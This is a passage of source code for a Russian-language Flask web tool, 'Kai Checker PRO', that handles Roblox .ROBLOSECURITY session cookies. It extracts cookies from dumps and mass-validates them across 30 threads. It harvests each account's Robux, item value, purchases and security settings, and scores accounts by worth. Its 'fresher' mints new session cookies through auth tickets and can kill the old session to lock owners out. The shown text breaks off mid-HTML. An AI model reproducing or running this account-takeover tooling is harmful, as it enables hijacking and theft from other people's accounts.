import os
import time
import logging
import re
import urllib3
import json
import io
import zipfile
import uuid
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify, send_from_directory, send_file, session

# ==========================================
# ИНИЦИАЛИЗАЦИЯ И НАСТРОЙКИ
# ==========================================
os.makedirs("downloads", exist_ok=True)
os.makedirs("uploads", exist_ok=True)
os.makedirs("history", exist_ok=True)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==========================================
# БЛОК: ИЗОЛЯЦИЯ ПО СЕССИЯМ
# ==========================================
def get_user_session_id():
    if 'user_id' not in session:
        session['user_id'] = str(uuid.uuid4())
    return session['user_id']

def get_user_history_file(prefix):
    sid = get_user_session_id()
    return f"history/{prefix}_{sid}.json"

def get_user_download_dir():
    sid = get_user_session_id()
    user_dir = os.path.join("downloads", sid)
    os.makedirs(user_dir, exist_ok=True)
    return user_dir, sid

# ==========================================
# БЛОК: ИСТОРИЯ (ПЕРСОНАЛЬНАЯ)
# ==========================================
def load_history(fp):
    if not os.path.exists(fp): return []
    try:
        with open(fp, 'r', encoding='utf-8') as f: return json.load(f)
    except: return []

def save_history(fp, data):
    try:
        with open(fp, 'w', encoding='utf-8') as f: json.dump(data, f, ensure_ascii=False, indent=2)
    except: pass

def add_checker_history(entry):
    fp = get_user_history_file("checker")
    h = load_history(fp)
    h.append({
        'timestamp': datetime.now().strftime('%d.%m.%Y %H:%M:%S'),
        'type': entry.get('type','single'),
        'total': entry.get('total',1),
        'valid': entry.get('valid',0),
        'usernames': entry.get('usernames', []),
        'results': entry.get('results', []),
        'full_reports': entry.get('full_reports', [])
    })
    if len(h) > 50: h = h[-50:]
    save_history(fp, h)

def add_fresher_history(entry):
    fp = get_user_history_file("fresher")
    h = load_history(fp)
    h.append({
        'timestamp': datetime.now().strftime('%d.%m.%Y %H:%M:%S'),
        'mode': entry.get('mode','duplicate'),
        'refreshed_count': entry.get('refreshed_count',0),
        'usernames': entry.get('usernames', []),
        'cookies': entry.get('cookies', [])
    })
    if len(h) > 50: h = h[-50:]
    save_history(fp, h)

# ==========================================
# БЛОК: ЧЕКЕР И АНАЛИТИКА
# ==========================================
def extract_cookies_from_text(text):
    cookies = []
    pattern = r'_\|WARNING:-DO-NOT-SHARE-THIS[^\s]*'
    for match in re.findall(pattern, text):
        cookie = match.strip('",;\'\\')
        if cookie.startswith('.ROBLOSECURITY='): cookie = cookie[15:]
        if len(cookie) > 50: cookies.append(cookie)
    pattern2 = r'\.ROBLOSECURITY=(_\|WARNING[^\s;]+)'
    for match in re.findall(pattern2, text):
        cookie = match.strip('",;\'\\')
        if len(cookie) > 50 and cookie not in cookies: cookies.append(cookie)
    seen = set()
    unique = []
    for c in cookies:
        if c not in seen: seen.add(c); unique.append(c)
    return unique

def get_user_rap(session, user_id):
    try:
        url = f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?assetType=All&limit=100"
        r = session.get(url, timeout=10, verify=False)
        if r.status_code == 200:
            data = r.json().get('data', [])
            val = sum(item.get('recentAveragePrice', 0) for item in data)
            return val if val > 0 else None
    except: pass
    return None

def get_user_playtime(session, user_id):
    try:
        url = f"https://screenshots.roblox.com/v1/users/{user_id}/play-time"
        r = session.get(url, timeout=10, verify=False)
        if r.status_code == 200:
            data = r.json()
            seconds = data.get('totalPlayTimeSeconds', 0)
            if seconds > 0:
                return round(seconds / 3600, 1)
    except: pass
    return None

def get_full_info(cookie):
    info = {
        'status':'❌', 'Username':'?', 'UserID':'?', 'Robux':0, 'RAP': None, 'PlaytimeHours': None,
        'Created':'?', 'Country':'?', 'EmailSet':False, 'TwoFactorEnabled':False,
        'AccountPinEnabled':False, 'PhoneSet':False, 'SecurityStatus':'⚠️ НИЗКИЙ',
        'Cookie':cookie, 'PurchasedGamepasses':{}, 'CreditCardsCount':0,
        'IsPremium':False, 'DonationTotal':0
    }
    try:
        c = cookie.strip()
        if ".ROBLOSECURITY=" in c: c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
        s = requests.Session()
        s.headers.update({'Cookie': f'.ROBLOSECURITY={c}', 'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'})
        r = s.get('https://users.roblox.com/v1/users/authenticated', timeout=15, verify=False)
        if r.status_code != 200: return info
        d = r.json()
        if 'id' not in d: return info
        info['UserID'] = d.get('id'); info['Username'] = d.get('name'); info['status'] = '✅'
        uid = info['UserID']

        def g(url):
            try:
                r = s.get(url, verify=False, timeout=10)
                return r.json() if r.status_code == 200 else {}
            except: return {}

        sd = g('https://www.roblox.com/my/settings/json')
        if sd:
            sec = sd.get('MyAccountSecurityModel',{})
            info['EmailSet'] = sec.get('IsEmailSet',False); info['TwoFactorEnabled'] = sec.get('IsTwoStepEnabled',False)
            info['AccountPinEnabled'] = sec.get('IsAccountPinEnabled',False); info['PhoneSet'] = sec.get('IsPhoneSet',False)
        
        pm = g(f'https://premiumfeatures.roblox.com/v1/users/{uid}/subscriptions')
        if pm and pm.get('isSubscribed'): info['IsPremium'] = True

        rd = g(f'https://users.roblox.com/v1/users/{uid}')
        if rd:
            try:
                dt = datetime.fromisoformat(rd.get('created','').replace('Z','+00:00'))
                info['Created'] = dt.strftime('%d.%m.%Y')
            except: pass

        rb = g(f'https://economy.roblox.com/v1/users/{uid}/currency')
        if rb: info['Robux'] = rb.get('robux',0)
        
        info['RAP'] = get_user_rap(s, uid)
        info['PlaytimeHours'] = get_user_playtime(s, uid)

        ct = g('https://users.roblox.com/v1/users/authenticated/country-code')
        if ct: info['Country'] = ct.get('countryCode','?')

        try:
            total = 0; gp_dict = {}; cursor = ""; page = 0
            while page < 5:
                url = f"https://economy.roblox.com/v2/users/{uid}/transactions?limit=100&transactionType=Purchase"
                if cursor: url += f"&cursor={cursor}"
                r = s.get(url, verify=False, timeout=10)
                if r.status_code != 200: break
                data = r.json()
                for item in data.get('data',[]):
                    price = abs(item.get('currency',{}).get('amount',0)); total += price
                    if price >= 50:
                        nm = item.get('details',{}).get('name','Товар')
                        pn = item.get('details',{}).get('place',{}).get('name','Другие игры')
                        if pn not in gp_dict: gp_dict[pn] = []
                        gp_dict[pn].append({'name':nm,'price':price})
                cursor = data.get('nextPageCursor')
                if not cursor: break
                page += 1; time.sleep(0.1)
            info['PurchasedGamepasses'] = gp_dict; info['DonationTotal'] = total
        except: pass

        sc = 0
        if info['EmailSet']: sc += 1
        if info['TwoFactorEnabled']: sc += 2
        if info['AccountPinEnabled']: sc += 1
        if info['PhoneSet']: sc += 1
        info['SecurityStatus'] = '🔒 ВЫСОКИЙ' if sc >= 4 else ('🔐 СРЕДНИЙ' if sc >= 2 else '⚠️ НИЗКИЙ')
    except: pass
    return info

def quick_validate(cookie):
    result = {
        'status':'❌', 'username':'?', 'user_id':'?', 'robux':0, 'rap': None, 'playtime': None,
        'created':'?', 'is_premium':False, 'has_email':False, 'has_2fa':False,
        'cookie':cookie, 'score':0, 'full_info': None
    }
    info = get_full_info(cookie)
    if info['status'] == '✅':
        result['status'] = '✅'
        result['username'] = info['Username']
        result['user_id'] = info['UserID']
        result['robux'] = info['Robux']
        result['rap'] = info['RAP']
        result['playtime'] = info['PlaytimeHours']
        result['created'] = info['Created']
        result['is_premium'] = info['IsPremium']
        result['has_email'] = info['EmailSet']
        result['has_2fa'] = info['TwoFactorEnabled']
        result['full_info'] = info
        
        score = 0
        if info['Robux'] >= 10000: score += 100
        elif info['Robux'] >= 1000: score += 50
        elif info['Robux'] > 0: score += 10
        if info['RAP'] and info['RAP'] > 5000: score += 50
        if info['IsPremium']: score += 50
        if info['EmailSet']: score += 15
        if info['TwoFactorEnabled']: score += 10
        result['score'] = score
    return result

def mass_check(cookies_list):
    results = []
    with ThreadPoolExecutor(max_workers=30) as ex:
        futures = {ex.submit(quick_validate, c): c for c in cookies_list}
        for f in as_completed(futures):
            try: results.append(f.result())
            except: results.append({'status':'❌','cookie':futures[f],'score':-1,'username':'?','user_id':'?','robux':0,'rap':None,'playtime':None,'created':'?','is_premium':False,'has_email':False,'has_2fa':False})
    valid = [r for r in results if r['status']=='✅']; invalid = [r for r in results if r['status']=='❌']
    valid.sort(key=lambda x: x['score'], reverse=True)
    return valid + invalid

# ==========================================
# ФОРМАТТЕРЫ (КУК В ИСТОРИИ ЕСТЬ, В ИНТЕРФЕЙСЕ НЕТ)
# ==========================================
def format_full_report(info):
    if info['status'] != '✅': return f"❌ НЕВАЛИДНЫЙ КУК\n{info['Cookie']}"
    gp = info.get('PurchasedGamepasses',{})
    rap_str = f"⏣ {info['RAP']:,}" if info['RAP'] is not None else "❌"
    play_str = f"{info['PlaytimeHours']} ч." if info['PlaytimeHours'] is not None else "❌"
    
    r = f"👤 {info['Username']} | 🆔 {info['UserID']} | 📅 {info['Created']} | 🌍 {info['Country']}\n"
    r += f"💰 Robux: ⏣ {info['Robux']:,} | 💎 RAP: {rap_str} | ⏱️ Плейтайм: {play_str}\n"
    r += f"💸 Донат: ⏣ {info['DonationTotal']:,} | ⭐ Premium: {'✅' if info['IsPremium'] else '❌'} | 🔐 {info['SecurityStatus']}\n"
    r += f"📧 Почта: {'✅' if info['EmailSet'] else '❌'} | 🔑 2FA: {'✅' if info['TwoFactorEnabled'] else '❌'}\n"
    if gp:
        r += "📦 ГЕЙМПАССЫ:\n"
        for game, passes in list(gp.items())[:3]:
            for p in passes[:5]: r += f"  {game} - {p['name']} ({p['price']} R$)\n"
    r += f"\n🍪 {info['Cookie']}"
    return r

def format_quick_report(result):
    if result['status'] == '✅':
        score = result.get('score',0)
        rank = "👑" if score>=150 else ("💎" if score>=100 else ("⭐" if score>=60 else "🟢"))
        badges = []
        if result.get('is_premium'): badges.append("💠")
        if result.get('has_2fa'): badges.append("🔐")
        rap_str = f"RAP: {result['rap']:,}" if result['rap'] is not None else "RAP: ❌"
        play_str = f"{result['playtime']}h" if result['playtime'] is not None else "⏱️ ❌"
        return f"{rank} {result['username']} [{result['user_id']}] | ⏣{result['robux']:,} ({rap_str}) | {play_str} | S:{score} {' '.join(badges)}"
    return f"❌ НЕВАЛИД"

# ==========================================
# БЛОК: ФРЕШЕР
# ==========================================
def refresh_roblox_cookie(cookie, kill_old=False):
    result = {'success': False, 'new_cookie': None, 'username': '?', 'user_id': '?', 'error': None}
    try:
        c = cookie.strip()
        if ".ROBLOSECURITY=" in c: c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
        cookies_dict = {'.ROBLOSECURITY': c}
        check_s = requests.Session()
        check_s.headers.update({'User-Agent': 'Mozilla/5.0'})
        check_r = check_s.get('https://users.roblox.com/v1/users/authenticated', cookies=cookies_dict, timeout=10, verify=False)
        if check_r.status_code != 200:
            result['error'] = "Кука невалидна"; return result
        user_data = check_r.json()
        result['username'] = user_data.get('name', '?'); result['user_id'] = user_data.get('id', '?')
        csrf_r = requests.post('https://auth.roblox.com/v2/logout', cookies=cookies_dict, headers={'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'}, verify=False, timeout=10)
        csrf_token = csrf_r.headers.get('x-csrf-token')
        if not csrf_token:
            result['error'] = "CSRF token not found"; return result
        ticket_headers = {'User-Agent': 'Mozilla/5.0', 'RBXauthenticationNegotiation': '1', 'referer': 'https://www.roblox.com/hewhewhew', 'X-CSRF-Token': csrf_token, 'Content-Type': 'application/json'}
        ticket_r = requests.post('https://auth.roblox.com/v1/authentication-ticket', headers=ticket_headers, cookies=cookies_dict, json={}, verify=False, timeout=15)
        auth_ticket = ticket_r.headers.get('rbx-authentication-ticket')
        if not auth_ticket:
            result['error'] = "Auth ticket not found"; return result
        redeem_headers = {'User-Agent': 'Mozilla/5.0', 'RBXauthenticationNegotiation': '1', 'Content-Type': 'application/json'}
        redeem_r = requests.post('https://auth.roblox.com/v1/authentication-ticket/redeem', headers=redeem_headers, json={"authenticationTicket": auth_ticket}, verify=False, timeout=15)
        new_cookie_value = None
        set_cookie = redeem_r.headers.get('Set-Cookie', '')
        if '.ROBLOSECURITY=' in set_cookie:
            match = re.search(r'\.ROBLOSECURITY=([^;]+)', set_cookie)
            if match: new_cookie_value = match.group(1)
        if not new_cookie_value:
            for co in redeem_r.cookies:
                if co.name == '.ROBLOSECURITY' and co.value: new_cookie_value = co.value; break
        if not new_cookie_value:
            result['error'] = "New cookie not found"; return result
        if kill_old:
            try:
                break_headers = {'User-Agent': 'Mozilla/5.0', 'X-CSRF-Token': csrf_token, 'Content-Type': 'application/json'}
                requests.post('https://auth.roblox.com/v2/logout', headers=break_headers, cookies=cookies_dict, verify=False, timeout=10)
            except: pass
        test_s = requests.Session()
        test_s.headers.update({'User-Agent': 'Mozilla/5.0'})
        test_r = test_s.get('https://users.roblox.com/v1/users/authenticated', cookies={'.ROBLOSECURITY': new_cookie_value}, verify=False, timeout=10)
        if test_r.status_code == 200 and 'id' in test_r.json():
            result['new_cookie'] = new_cookie_value; result['success'] = True
        else:
            result['error'] = "New cookie validation failed"
    except Exception as e:
        result['error'] = str(e)
    return result

# ==========================================
# БЛОК: ИНСТРУМЕНТЫ
# ==========================================
def merge_cookie_files(contents):
    all_cookies = []
    for c in contents:
        extracted = extract_cookies_from_text(c)
        all_cookies.extend(extracted)
    unique = list(dict.fromkeys(all_cookies))
    return '\n'.join(unique)

def remove_duplicates(content):
    cookies = extract_cookies_from_text(content)
    return '\n'.join(cookies)

# ==========================================
# БЛОК: FLASK APP
# ==========================================
app = Flask(__name__)
app.secret_key = os.urandom(24)

# ==========================================
# БЛОК: HTML (ПОЛНЫЙ ИНТЕРФЕЙС)
# ==========================================
HTML = r"""<!DOCTYPE html>
<html lang="ru" data-theme="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kai Checker PRO</title>
    <link href="https://fonts.googleapis.com/css2?family=Rubik+Puddles&family=Paytone+One&family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #07030d;
            --bg-card: rgba(23, 10, 38, 0.55);
            --border-card: rgba(168, 85, 247, 0.25);
            --border-hover: rgba(217, 70, 239, 0.6);
            --input-bg: rgba(12, 5, 20, 0.75);
            --text-main: #f3e8ff;
            --text-muted: #a78bfa;
            --accent-purple: #9333ea;
            --accent-pink: #c026d3;
            --accent-glow: rgba(168, 85, 247, 0.2);
            --gradient-primary: linear-gradient(135deg, #a855f7 0%, #d946ef 50%, #6366f1 100%);
            --gradient-btn: linear-gradient(135deg, #7e22ce 0%, #a855f7 100%);
            --gradient-btn-hover: linear-gradient(135deg, #9333ea 0%, #c026d3 100%);
        }
        [data-theme="light"] {
            --bg: #f5f0ff;
            --bg-card: rgba(255, 255, 255, 0.75);
            --border-card: rgba(168, 85, 247, 0.2);
            --border-hover: rgba(168, 85, 247, 0.5);
            --input-bg: rgba(243, 232, 255, 0.6);
            --text-main: #2e1065;
            --text-muted: #7e22ce;
            --accent-purple: #7e22ce;
            --accent-pink: #c026d3;
            --accent-glow: rgba(126, 34, 206, 0.15);
            --gradient-primary: linear-gradient(135deg, #7e22ce 0%, #c026d3 100%);
            --gradient-btn: linear-gradient(135deg, #7e22ce 0%, #a855f7 100%);
            --gradient-btn-hover: linear-gradient(135deg, #6b21a8 0%, #9333ea 100%);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; outline: none; }
        body {
            font-family: 'Plus Jakarta Sans', sans-serif;
            min-height: 100vh;
            background: var(--bg);
            color: var(--text-main);
            position: relative;
            overflow-x: hidden;
            padding: 24px 16px;
        }

        #particles-canvas {
            position: fixed;
            top: 0; left: 0;
            width: 100vw; height: 100vh;
            z-index: 0;
            pointer-events: none;
        }
        .bg-glow {
            position: fixed;
            width: 500px; height: 500px;
            background: radial-gradient(circle, rgba(168, 85, 247, 0.12) 0%, rgba(0,0,0,0) 70%);
            top: -100px; left: 50%;
            transform: translateX(-50%);
            z-index: 0;
            pointer-events: none;
            animation: pulseGlow 8s infinite alternate ease-in-out;
        }
        @keyframes pulseGlow {
            0% { transform: translateX(-50%) scale(1); opacity: 0.5; }
            100% { transform: translateX(-50%) scale(1.2); opacity: 0.8; }
        }

        .wrapper {
            max-width: 1350px;
            margin: 0 auto;
            position: relative;
            z-index: 1;
            background: var(--bg-card);
            border: 1px solid var(--border-card);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border-radius: 28px;
            padding: 32px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.05);
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding-bottom: 24px;
            border-bottom: 1px solid var(--border-card);
            margin-bottom: 28px;
            flex-wrap: wrap;
            gap: 16px;
        }
        .logo-wrap { display: flex; align-items: center; gap: 14px; }

        .logo-text {
            font-family: 'Paytone One', 'Rubik Puddles', cursive, sans-serif;
            font-size: 38px;
            font-weight: 900;
            letter-spacing: 1px;
            background: linear-gradient(135deg, #f472b6 0%, #d946ef 40%, #a855f7 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 15px rgba(217, 70, 239, 0.3);
            transform: skew(-4deg);
            display: inline-block;
        }
        .badge-pro {
            font-size: 11px; font-weight: 800;
            background: rgba(168, 85, 247, 0.15);
            color: var(--accent-pink);
            padding: 4px 12px; border-radius: 20px;
            border: 1px solid var(--border-card);
            letter-spacing: 1.5px;
        }

        .stats-bar { display: flex; gap: 12px; flex-wrap: wrap; }
        .stat-card {
            background: var(--input-bg);
            border: 1px solid var(--border-card);
            padding: 8px 16px; border-radius: 16px;
            display: flex; flex-direction: column; align-items: center; min-width: 90px;
        }
        .stat-val { font-size: 16px; font-weight: 800; color: var(--accent-pink); }
        .stat-lbl { font-size: 10px; color: var(--text-muted); font-weight: 600; text-transform: uppercase; }

        .tabs {
            display: flex; gap: 12px; margin-bottom: 32px;
            background: var(--input-bg);
            padding: 8px; border-radius: 22px;
            border: 1px solid var(--border-card);
            width: fit-content; flex-wrap: wrap;
            box-shadow: 0 8px 30px rgba(0,0,0,0.25);
        }
        .tab {
            padding: 14px 32px; border-radius: 16px;
            color: var(--text-muted); cursor: pointer;
            font-size: 15px; font-weight: 700;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            border: 1px solid transparent; background: transparent;
            display: flex; align-items: center; gap: 8px;
        }
        .tab:hover {
            color: var(--text-main);
            background: rgba(168, 85, 247, 0.1);
            border-color: rgba(168, 85, 247, 0.2);
            transform: translateY(-1px);
        }
        .tab.active {
            background: var(--gradient-btn);
            color: #fff;
            border-color: rgba(255, 255, 255, 0.15);
            box-shadow: 0 6px 18px var(--accent-glow);
            transform: translateY(-1px);
        }
        .tab-content { display: none; }
        .tab-content.active { display: block; }

        .card {
            background: var(--bg-card);
            border: 1px solid var(--border-card);
            border-radius: 20px; padding: 24px;
            margin-bottom: 20px;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
        }
        .card:hover {
            border-color: var(--border-hover);
            box-shadow: 0 10px 25px var(--accent-glow);
        }
        .card h2, .card h3 {
            font-size: 16px; font-weight: 800; margin-bottom: 16px;
            color: var(--text-main); display: flex; align-items: center; gap: 8px;
        }

        .btn {
            position: relative; overflow: hidden;
            padding: 12px 24px; border: none; border-radius: 14px;
            font-size: 13px; font-weight: 700; cursor: pointer;
            color: #fff; display: inline-flex; align-items: center;
            justify-content: center; gap: 8px; text-decoration: none;
            transition: all 0.25s; box-shadow: 0 4px 12px rgba(0,0,0,0.2);
        }
        .btn-primary { background: var(--gradient-btn); }
        .btn-primary:hover { background: var(--gradient-btn-hover); box-shadow: 0 4px 15px var(--accent-glow); transform: translateY(-1px); }
        .btn-secondary { background: var(--input-bg); border: 1px solid var(--border-card); color: var(--text-muted); }
        .btn-secondary:hover { color: var(--text-main); border-color: var(--accent-purple); }
        .btn-danger { background: rgba(239, 68, 68, 0.15); border: 1px solid rgba(239, 68, 68, 0.3); color: #fca5a5; }
        .btn-danger:hover { background: rgba(239, 68, 68, 0.3); }
        .btn-sm { padding: 8px 16px; font-size: 12px; border-radius: 10px; }

        .fresher-mode-btn.active-mode {
            background: var(--gradient-btn) !important;
            color: #fff !important;
            border-color: var(--accent-pink) !important;
            box-shadow: 0 0 12px var(--accent-glow);
            transform: scale(1.02);
        }

        textarea, input[type="number"], input[type="text"] {
            width: 100%; padding: 14px;
            background: var(--input-bg);
            border: 1px solid var(--border-card);
            border-radius: 14px; color: var(--text-main);
            font-family: monospace; font-size: 12px;
            transition: border-color 0.2s;
        }
        textarea:focus, input:focus { border-color: var(--accent-pink); box-shadow: 0 0 8px var(--accent-glow); }

        .upload-area {
            min-height: 110px; border: 2px dashed var(--border-card);
            border-radius: 16px; background: var(--input-bg);
            display: flex; flex-direction: column; align-items: center;
            justify-content: center; cursor: pointer; transition: all 0.25s; text-align: center;
            padding: 16px;
        }
        .upload-area:hover, .upload-area.drag-over {
            border-color: var(--accent-pink); background: rgba(168, 85, 247, 0.05);
            box-shadow: 0 0 10px var(--accent-glow);
        }

        .result-container {
            margin-top: 16px;
            position: relative;
        }
        .result-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 6px;
        }
        .result-title {
            font-size: 12px;
            font-weight: 700;
            color: var(--text-muted);
        }

        .action-btn-group {
            display: flex;
            gap: 6px;
            align-items: center;
        }

        .btn-toggle-box {
            background: rgba(168, 85, 247, 0.15);
            border: 1px solid var(--border-card);
            color: var(--text-main);
            padding: 4px 12px;
            border-radius: 8px;
            font-size: 11px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
        }
        .btn-toggle-box:hover {
            background: rgba(168, 85, 247, 0.3);
            border-color: var(--accent-pink);
        }

        .btn-download-txt, .btn-download-zip {
            background: rgba(217, 70, 239, 0.15);
            border: 1px solid rgba(217, 70, 239, 0.3);
            color: var(--accent-pink);
            padding: 4px 12px;
            border-radius: 8px;
            font-size: 11px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
        }
        .btn-download-txt:hover, .btn-download-zip:hover {
            background: rgba(217, 70, 239, 0.3);
            box-shadow: 0 0 8px var(--accent-glow);
        }

        .result-box {
            background: var(--input-bg); border: 1px solid var(--border-card);
            border-radius: 14px; padding: 14px;
            max-height: 400px; overflow-y: auto; font-family: monospace;
            font-size: 12px; color: var(--text-main); white-space: pre-wrap; word-break: break-all;
            margin-top: 6px;
        }

        .progress-bar {
            margin-top: 12px; background: var(--input-bg);
            border-radius: 20px; height: 8px; overflow: hidden; border: 1px solid var(--border-card);
        }
        .progress-fill { height: 100%; width: 0%; background: var(--gradient-btn); transition: width 0.3s ease; }

        .checker-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
        @media(max-width:900px){ .checker-grid { grid-template-columns: 1fr; } }

        .theme-btn {
            background: var(--input-bg); border: 1px solid var(--border-card);
            border-radius: 30px; padding: 8px 16px; cursor: pointer;
            font-size: 12px; color: var(--text-main); font-weight: 700; transition: all 0.2s;
        }
        .theme-btn:hover { border-color: var(--accent-purple); }

        .footer {
            text-align: center; padding-top: 20px; color: var(--text-muted);
            font-size: 12px; font-weight: 600; border-top: 1px solid var(--border-card); margin-top: 24px;
        }
        
        .history-card {
            background: var(--input-bg); border: 1px solid var(--border-card);
            border-radius: 16px; padding: 16px; margin-bottom: 14px;
        }
        .history-header {
            display: flex; justify-content: space-between; align-items: center;
            font-size: 13px; font-weight: 700; color: var(--accent-pink);
            flex-wrap: wrap; gap: 8px;
        }
        .history-users {
            font-size: 11px; color: var(--text-main); margin-top: 6px; font-weight: 600;
            display: flex; align-items: center; gap: 8px; flex-wrap: wrap;
        }
        
        .tool-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 20px; }

        /* --- КАСТОМНОЕ УВЕДОМЛЕНИЕ В ПРАВОМ ВЕРХНЕМ УГЛУ (TOAST) --- */
        .custom-alert-overlay {
            position: fixed;
            top: 24px;
            right: 24px;
            z-index: 99999;
            pointer-events: none;
        }

        .custom-alert-card {
            pointer-events: auto;
            background: rgba(23, 10, 38, 0.95);
            border: 1px solid var(--border-hover);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5), 0 0 15px var(--accent-glow);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border-radius: 16px;
            padding: 14px 20px;
            display: flex;
            align-items: center;
            gap: 12px;
            min-width: 280px;
            max-width: 360px;
            transform: translateY(-20px) scale(0.95);
            opacity: 0;
            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        .custom-alert-overlay.show .custom-alert-card {
            transform: translateY(0) scale(1);
            opacity: 1;
        }

        .alert-icon { 
            font-size: 22px; 
            line-height: 1;
        }

        .alert-body {
            display: flex;
            flex-direction: column;
            gap: 2px;
            flex-grow: 1;
        }

        .alert-body h3 { 
            margin: 0; 
            color: #fff; 
            font-size: 13px; 
            font-weight: 700;
        }

        .alert-body p { 
            color: var(--text-muted); 
            font-size: 12px; 
            margin: 0; 
            word-break: break-word; 
            font-weight: 500;
        }

        .alert-close-btn {
            background: transparent;
            border: none;
            color: var(--text-muted);
            font-size: 16px;
            cursor: pointer;
            padding: 4px;
            line-height: 1;
            transition: color 0.2s;
        }

        .alert-close-btn:hover {
            color: #fff;
        }
    </style>
</head>
<body>
<canvas id="particles-canvas"></canvas>
<div class="bg-glow"></div>

<!-- Выплывающее уведомление в углу -->
<div id="custom-alert" class="custom-alert-overlay">
    <div class="custom-alert-card">
        <div class="alert-icon">⚠️</div>
        <div class="alert-body">
            <h3>Внимание</h3>
            <p id="custom-alert-msg">Вставьте кук!</p>
        </div>
        <button class="alert-close-btn" onclick="closeAlert()">✕</button>
    </div>
</div>

<div class="wrapper">
    <!-- Шапка -->
    <div class="header">
        <div class="logo-wrap">
            <div class="logo-text">KAI CHECKER</div>
            <span class="badge-pro">PRO EDITION</span>
        </div>
        <div class="stats-bar">
            <div class="stat-card"><span class="stat-val" id="statValid">0</span><span class="stat-lbl">Валид</span></div>
            <div class="stat-card"><span class="stat-val" id="statRobux">0</span><span class="stat-lbl">Robux</span></div>
            <div class="stat-card"><span class="stat-val" id="statPremium">0</span><span class="stat-lbl">Premium</span></div>
        </div>
        <button class="theme-btn" onclick="toggleTheme()">🌓 Тема</button>
    </div>

    <!-- Вкладки -->
    <div class="tabs">
        <button class="tab active" data-tab="checker">🔍 Чекер</button>
        <button class="tab" data-tab="fresher">🔄 Фрешер</button>
        <button class="tab" data-tab="history">📋 История</button>
        <button class="tab" data-tab="tools">🧰 Инструменты</button>
    </div>

    <!-- ЧЕКЕР -->
    <div class="tab-content active" id="tab-checker">
        <div class="checker-grid">
            <div class="card">
                <h2>🔍 Одиночная проверка</h2>
                <textarea id="singleCookie" placeholder="Вставьте ОДИН .ROBLOSECURITY кук..." rows="5"></textarea>
                <div style="margin-top:12px;">
                    <button class="btn btn-primary" onclick="runSingleCheck()" style="width:100%;">Проверить кук</button>
                </div>
                <div class="result-container" id="singleContainer" style="display:none;">
                    <div class="result-header">
                        <span class="result-title">РЕЗУЛЬТАТ:</span>
                        <div class="action-btn-group">
                            <button class="btn-download-txt" onclick="downloadTxtFromBox('singleResult', 'single_report.txt')">📥 Скачать TXT</button>
                            <button class="btn-toggle-box" id="btnToggle_singleResult" onclick="toggleBox('singleResult')">▼ Свернуть</button>
                        </div>
                    </div>
                    <div class="result-box" id="singleResult"></div>
                </div>
            </div>
            <div class="card">
                <h2>📦 Массовая проверка (30 Потоков)</h2>
                <div class="upload-area" id="massDropArea" onclick="document.getElementById('massFile').click()">
                    <p style="font-weight:700;">📁 Перетащите TXT файл с куками</p>
                    <p style="font-size:11px;color:var(--text-muted);margin-top:4px;">или нажмите для выбора</p>
                </div>
                <input type="file" id="massFile" accept=".txt" style="display:none;">
                <div id="massFileInfo" style="font-size:12px;color:var(--accent-pink);margin-top:6px;font-weight:600;"></div>
                <div style="margin-top:12px;">
                    <button class="btn btn-primary" onclick="runMassCheck()" style="width:100%;">🚀 Запустить массовый чек</button>
                </div>
                <div class="progress-bar"><div class="progress-fill" id="massProgress"></div></div>
                
                <div class="result-container" id="massContainer" style="display:none;">
                    <div class="result-header">
                        <span class="result-title">РЕЗУЛЬТАТЫ ЧЕКА:</span>
                        <div class="action-btn-group">
                            <button class="btn-download-zip" onclick="downloadMassZip()">📦 Скачать ZIP (Все аккаунты)</button>
                            <button class="btn-download-txt" onclick="downloadTxtFromBox('massResult', 'mass_report.txt')">📥 Скачать TXT</button>
                            <button class="btn-toggle-box" id="btnToggle_massResult" onclick="toggleBox('massResult')">▼ Свернуть</button>
                        </div>
                    </div>
                    <div class="result-box" id="massResult"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- ФРЕШЕР -->
    <div class="tab-content" id="tab-fresher">
        <div class="card">
            <h2>🔄 Обновление сессий (20 Потоков)</h2>
            <div style="display:flex;gap:12px;margin-bottom:14px;align-items:center;">
                <span style="font-size:13px;font-weight:700;color:var(--text-muted);">Режим работы:</span>
                <button class="btn btn-secondary btn-sm fresher-mode-btn active-mode" id="btnDup" onclick="setFresherMode('duplicate')">♻️ Дублировать</button>
                <button class="btn btn-secondary btn-sm fresher-mode-btn" id="btnKill" onclick="setFresherMode('kill')">💀 Инвалидировать старую</button>
            </div>
            <input type="hidden" id="fresherMode" value="duplicate">
            <textarea id="fresherCookies" placeholder="Вставьте куки списком..." rows="6"></textarea>
            <div style="margin-top:12px;display:flex;gap:10px;">
                <button class="btn btn-primary" onclick="runFresher()">⚡ Обновить куки</button>
            </div>
            
